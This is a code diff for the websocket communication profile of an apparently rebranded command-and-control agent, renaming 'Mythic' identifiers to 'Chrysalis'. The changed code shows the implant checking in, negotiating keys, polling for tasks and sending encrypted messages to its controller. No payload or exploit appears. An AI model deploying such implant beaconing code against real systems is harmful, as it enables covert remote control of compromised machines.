@@ -20,7 +20,7 @@ import (
 	"github.com/gorilla/websocket"
 	"github.com/spf13/viper"
 
-	//     chrysalis
+	// chrysalis
 	"github.com/FractalKnight/chrysalis/pkg/utils/crypto"
 	"github.com/FractalKnight/chrysalis/pkg/utils/structs"
 )
@@ -151,28 +151,28 @@ func New() structs.Profile {
 }
 
 func (c *xWebsockets) Start() {
-	// Checkin with Mythic via an egress channel
+	// Checkin with Chrysalis via an egress channel
 	resp := c.CheckIn()
 	checkIn := resp.(structs.CheckInMessageResponse)
 	// If we successfully checkin, get our new ID and start looping
 	if strings.Contains(checkIn.Status, "success") {
-		SetMythicID(checkIn.ID)
+		SetChrysalisID(checkIn.ID)
 		for {
 			// loop through all task responses
-			message := CreateMythicMessage()
+			message := CreateChrysalisMessage()
 			encResponse, _ := json.Marshal(message)
-			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
+			//fmt.Printf("Sending to Chrysalis: %v\n", string(encResponse))
 			resp := c.SendMessage(encResponse).([]byte)
 			if len(resp) > 0 {
 				//fmt.Printf("Raw resp: \n %s\n", string(resp))
-				taskResp := structs.MythicMessageResponse{}
+				taskResp := structs.ChrysalisMessageResponse{}
 				err := json.Unmarshal(resp, &taskResp)
 				if err != nil {
 					//log.Printf("Error unmarshal response to task response: %s", err.Error())
 					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 					continue
 				}
-				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+				HandleInboundChrysalisMessageFromEgressP2PChannel <- taskResp
 			}
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 		}
@@ -264,7 +264,7 @@ func (c *xWebsockets) CheckIn() interface{} {
 	}
 
 	if len(response.ID) > 0 {
-		SetMythicID(response.ID)
+		SetChrysalisID(response.ID)
 	}
 	//fmt.Printf("Sucessfully negotiated a connection\n")
 	return response
@@ -310,7 +310,7 @@ func (c *xWebsockets) NegotiateKey() bool {
 	c.ExchangingKeys = false
 
 	if len(sessionKeyResp.UUID) > 0 {
-		SetMythicID(sessionKeyResp.UUID)
+		SetChrysalisID(sessionKeyResp.UUID)
 	} else {
 		return false
 	}
@@ -348,8 +348,8 @@ func (c *xWebsockets) sendData(tag string, sendData []byte) interface{} {
 		sendData = c.encryptMessage(sendData)
 	}
 
-	if GetMythicID() != "" {
-		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
+	if GetChrysalisID() != "" {
+		sendData = append([]byte(GetChrysalisID()), sendData...) // Prepend the UUID
 	} else {
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	}
